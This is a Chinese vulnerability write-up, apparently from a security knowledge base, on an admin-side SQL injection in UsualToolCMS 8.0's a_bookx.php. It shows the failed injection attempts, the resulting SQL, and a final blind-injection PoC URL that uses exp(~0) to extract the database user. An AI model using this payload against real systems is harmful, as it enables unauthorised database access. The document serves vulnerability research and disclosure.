---
source: "hatch 补库批 20260928"
product: "UsualToolCMS8.0 a_bookx"
record_type: "analysis"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "UsualToolcms 8.0 a_bookx.php 后台注入漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：后台咨询移动/删除权限、MySQL5.5.53实验溢出exp错误行为"
side_effects: "未执行；本文需注意的操作影响：动作t=move却响应叫咨询删除，真实功能需确认；id数组拼SQL和DB返回布尔明确；MySQL>=范围错误行为泛化需官方版本核验；无完整请求会话，修改catid副作用"
source_status: "unknown"
id: "vw-76406ff22e1f7309b355d9ef"
entity_id: "ve-76406ff22e1f7309b355d9ef"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：后台咨询移动/删除权限、MySQL5.5.53实验溢出exp错误行为

- **适用与权限边界（1）**：保留sleep/updatexml/extractvalue/join/floor失败与exp条件分支成功，是互补研究不能只留最终PoC。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **操作与副作用边界（2）**：动作t=move却响应叫咨询删除，真实功能需确认；id数组拼SQL和DB返回布尔明确。保留原步骤及请求方法。执行条件包括隔离且获授权的可恢复环境、预先记录相关文件/账号/配置/业务记录状态；响应完成不能等同无副作用，恢复时须核对该操作涉及的实际对象。

- **凭据与会话边界（3）**：MySQL&gt;=范围错误行为泛化需官方版本核验；无完整请求会话，修改catid副作用。抓包中的会话不能视为未认证访问证明。需重新取得授权测试会话，不能复用文中值。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# UsualToolcms 8.0 a\_bookx.php 后台注入漏洞

一、漏洞简介
------------

二、漏洞影响
------------

UsualToolcms 8.0

三、复现过程
------------

![1.png](./.resource/UsualToolcms8.0a_bookx.php后台注入漏洞/media/rId24.png)

mysqli\_query不支持堆叠，无回显初步构造payload：

    t=move&id[0]=1',(select 1 and sleep(10)),'2

执行的SQL语句：

    UPDATE `cms_book` set catid='' WHERE id in('1',(select 1 and sleep(10)),'2')

能够正确执行的SQL语句：

    UPDATE `cms_book` set catid='' WHERE id in(1,(select 1 and sleep(10)))

因此初步设想以失败告终，\$result返回bool值，True显示咨询删除成功，false则显示咨询删除失败则可以if构造语句，语句判断语句为真则执行一条可执行的语句，假若为假执行一条报错语句即可使result为False的语句

updatexml，if条件真假与否都会报错

![2.png](./.resource/UsualToolcms8.0a_bookx.php后台注入漏洞/media/rId25.png)

extractvalue，if条件真假与否都会报错

![3.png](./.resource/UsualToolcms8.0a_bookx.php后台注入漏洞/media/rId26.png)

join报错:`select id from mysql.user a join mysql.user b ，result`返回结果均为true

![4.png](./.resource/UsualToolcms8.0a_bookx.php后台注入漏洞/media/rId27.png)

floor报错：`SELECT COUNT(*) FROM user GROUP BY FLOOR(RAND(0)*2);`同样返回结果均为true

![5.png](./.resource/UsualToolcms8.0a_bookx.php后台注入漏洞/media/rId28.png)

exp():
mysql\>=5.5.5会报错;mysql\>=5.5.53，报错不能注出数据，我这里为5.5.53，但是可以用于使语句返回结果为false

![6.png](./.resource/UsualToolcms8.0a_bookx.php后台注入漏洞/media/rId29.png)

### POC：

    https://www.0-sec.org/demo/cmsadmin/a_bookx.php?t=move&id[0]=1%27)or%20if((substr((select%20user()),1,1))=%27d%27,(select%201),exp(~0));%23

![7.png](./.resource/UsualToolcms8.0a_bookx.php后台注入漏洞/media/rId31.png)

参考链接
--------

> https://xz.aliyun.com/t/8100
